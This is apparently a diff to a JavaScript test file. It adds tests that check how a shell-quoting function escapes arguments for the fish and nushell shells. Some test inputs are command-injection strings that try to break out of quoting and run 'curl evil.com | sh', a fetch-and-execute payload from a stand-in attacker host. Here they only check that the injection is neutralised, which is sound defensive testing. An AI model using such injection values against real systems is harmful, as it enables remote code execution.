@@ -117,3 +117,13 @@ test('full simulated schedule command is safe under a malicious frontmatter', ()
   // Argv tokens survive as single-quoted strings.
   assert.ok(cmd.includes(`'x"; curl evil.com | sh; echo "'`), `expected quoted model arg in: ${cmd}`);
 });
+
+test('quoteArgForShell keeps backslashes and quotes literal in fish', () => {
+  assert.equal(quoteArgForShell('/opt/homebrew/bin/fish', "x\\' ; curl evil | sh ; echo '"), "'x\\\\\\' ; curl evil | sh ; echo \\''");
+  assert.equal(quoteArgForShell('/opt/homebrew/bin/fish', 'ends in \\'), "'ends in \\\\'");
+});
+
+test('quoteArgForShell uses a raw string in nushell that the value cannot close', () => {
+  assert.equal(quoteArgForShell('/usr/local/bin/nu', "it's"), "r#'it's'#");
+  assert.equal(quoteArgForShell('/usr/local/bin/nu', "a'## b"), "r###'a'## b'###");
+});
